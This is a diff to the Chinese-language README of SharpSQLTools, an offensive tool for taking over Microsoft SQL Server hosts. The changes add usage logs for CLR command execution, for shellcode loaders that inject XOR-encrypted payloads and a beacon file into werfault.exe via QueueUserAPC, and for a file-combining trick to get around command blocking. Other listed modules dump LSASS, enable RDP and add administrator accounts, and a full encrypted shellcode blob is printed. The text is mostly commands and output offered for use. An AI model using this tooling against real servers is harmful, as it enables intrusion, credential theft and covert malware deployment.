@@ -1,10 +1,26 @@
-### 简介
+- 简介
 
 和[RcoIl](http://github.com/rcoIl)一起写的小工具，可上传下载文件，xp_cmdshell与sp_oacreate双回显和clr加载程序集执行相应操作。功能参考[mssqlproxy](https://github.com/blackarrowsec/mssqlproxy)，由于目前C#还不知如何获取SQL连接的socket，该项目中的mssqlproxy功能目前尚未实现。另外，Clr不适用于一些与线程进程相关的操作。
 
 ##### 编译环境为net 4.0 
 
-### 吹一波[RcoIl](http://github.com/rcoIl)，关注[RcoIl](http://github.com/rcoIl)跟着大佬学C#！！！
+### 更新日志
+
+- 2021-07-10 
+  - 修复上传bug
+  - 修复clr回显bug
+- 2021-06-22
+  - 添加clr执行命令和程序 
+  - 添加clr合并文件功能，方便在cmd被拦截时代替copy /b合并文件 
+  - 修改支持自定义端口 
+- 2021-05-27
+  - 支持shellcode远程加载
+- 2021-01-19
+  - 支持xp_cmdshell与sp_oacreate双回显
+  - 支持clr加载程序集执行
+  - 支持上传下载文件
+- 2019-12-18
+  - 发布最初命令行版
 
 ### Usage
 
@@ -23,8 +39,8 @@
 
 Usage:
 
-SharpSQLTools target username password database                   - interactive console
-SharpSQLTools target username password database module command    - non-interactive console
+SharpSQLTools target:port username password database                   - interactive console
+SharpSQLTools target:port username password database module command    - non-interactive console
 
 Module:
 
@@ -40,7 +56,9 @@ enable_clr                 - you know what it means
 disable_clr                - you know what it means
 install_clr                - create assembly and procedure
 uninstall_clr              - drop clr
-clr_dumplsass              - dumplsass by clr
+clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
+clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files
+clr_dumplsass {path}       - dumplsass by clr
 clr_rdp                    - check RDP port and Enable RDP
 clr_getav                  - get anti-virus software on this machin by clr
 clr_adduser {user} {pass}  - add user by clr
@@ -57,8 +75,8 @@ exit                       - terminates the server process (and this session)
 支持交互模式与非交互模式，交互模式直接跟目标，用户名和密码即可。非交互模式直接跟模块与命令。
 
 ```
-SharpSQLTools target username password database                   - interactive console
-SharpSQLTools target username password database module command    - non-interactive console
+SharpSQLTools target:port username password database                   - interactive console
+SharpSQLTools target:port username password database module command    - non-interactive console
 ```
 
 
@@ -66,7 +84,7 @@ SharpSQLTools target username password database module command    - non-interact
 #### xp_cmdshell执行命令
 
 ```
-λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX xp_cmdshell whoami master
+λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX xp_cmdshell master whoami 
 [*] Database connection is successful!
 
 nt authority\system
@@ -84,6 +102,35 @@ nt authority\system
 nt service\mssqlserver
 ```
 
+#### clr执行命令
+
+```
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_exec whoami
+[*] Database connection is successful!
+[+] Process: cmd.exe
+[+] arguments:  /c whoami
+[+] RunCommand: cmd.exe  /c whoami
+
+nt service\mssql$sqlexpress
+
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_exec -p c:\windows/system32\whoami.exe
+[*] Database connection is successful!
+[+] Process: c:\windows/system32\whoami.exe
+[+] arguments:
+[+] RunCommand: c:\windows/system32\whoami.exe
+
+nt service\mssql$sqlexpress
+
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_exec -p c:\cmd.exe -a /c whoami
+[*] Database connection is successful!
+[+] Process: c:\cmd.exe
+[+] arguments:  /c whoami
+[+] RunCommand: c:\cmd.exe   /c whoami
+
+nt service\mssql$sqlexpress
+
+```
+
 #### clr_scloader
 ```
 λ python Encrypt.py -f nc.bin -k 1234
@@ -94,7 +141,7 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 [*] Database connection is successful!
 [+] EncryptShellcode: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMeE3Xw+z51MPPR2WNzYny6YBO/cw57NeG5s7wxMjN8tPJHU3kz42S6eitwunITfTDi0GJ5zfp1uga7fDDkfgX4egL0nXPy/TxzMvUJ0kbFfTF/EDl3CuVE6mtwunIXfTDiVXW6PntwunIvfTDicr81uns14XNrdWlsam5wanJtcGh7t90ScmbO0mt1aGh7vyPbZMvOzW59j0VABm4BATQxc2V9uNR7td2SMjQxe7rReI4xNDgv85wxV3JgeLvXeLjDco59RRUzzud/vdtaMjUxMmp1ixuzXzHN5mRhfwL9fAPzfM7ye73zesz0ebvydYvYPOvRzeZ8uPVZJHBqf73TerrNcIiqkUVTzOF5s/d0MzIzfYlRXlAxMjM0MXNjdWF6utZmZWR5APJZOWhzY9bNVPRwFWYyNXm/dxAp9DNcebvVYmFzY3Vhc2N9zvJyZHjN+3m483+98HOJTf0NtcvkegLmec35vz9ziTy2L1PL5InDgZNkco6Xp46pzud7t/UaDzJNOLPP0Uc2j3YhQVtbMmp1uOjM4Q==
 [+] XorKey: 1234
-[+] StartProcess notepad.exe
+[+] StartProcess werfault.exe
 [+] OpenProcess Pid: 2508
 [+] VirtualAllocEx Success
 [+] QueueUserAPC Inject shellcode to PID: 2508 Success
@@ -104,6 +151,36 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 [*] QueueUserAPC Inject shellcode Success, enjoy!
 ```
 
+#### clr_scloader1
+```
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_scloader1 C:\Users\Public\payload.txt aaaa
+[*] Database connection is successful!
+[+] EncryptShellcodePath: C:\Users\Public\payload.txt
+[+] XorKey: aaaa
+[+] StartProcess werfault.exe
+[+] OpenProcess Pid: 3232
+[+] VirtualAllocEx Success
+[+] QueueUserAPC Inject shellcode to PID: 3232 Success
+[+] hOpenProcessClose Success
+
+
+[*] QueueUserAPC Inject shellcode Success, enjoy!
+```
+
+#### clr_scloader2
+```
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_scloader2 C:\Users\Public\beacon.bin
+[*] Database connection is successful!
+[+] ShellcodePath: C:\Users\Public\beacon.bin
+[+] StartProcess werfault.exe
+[+] OpenProcess Pid: 332
+[+] VirtualAllocEx Success
+[+] QueueUserAPC Inject shellcode to PID: 332 Success
+[+] hOpenProcessClose Success
+
+
+[*] QueueUserAPC Inject shellcode Success, enjoy!
+```
 
 #### clr_dumplsass
 
@@ -153,7 +230,15 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 [*] Adding Group Member success
 ```
 
-
+#### clr_combine
+```
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_combine C:\Users\Public\payload.txt
+[*] Database connection is successful!
+[+] remoteFile: C:\Users\Public\payload.txt
+[+] count: 5
+[+] combinefile: C:\Users\Public\payload.txt_*.config_txt C:\Users\Public\payload.txt
+[*] 'C:\Users\Public\payload.txt_*.config_txt' CombineFile completed	
+```
 
 #### clr_download
 
@@ -202,3 +287,5 @@ https://github.com/blackarrowsec/mssqlproxy
 https://github.com/An0nySec/ShadowUser/blob/main/ShadowUser/Program.cs#L235
 
 https://github.com/GhostPack/SharpDump
+
+https://gist.github.com/jfmaes/944991c40fb34625cf72fd33df1682c0
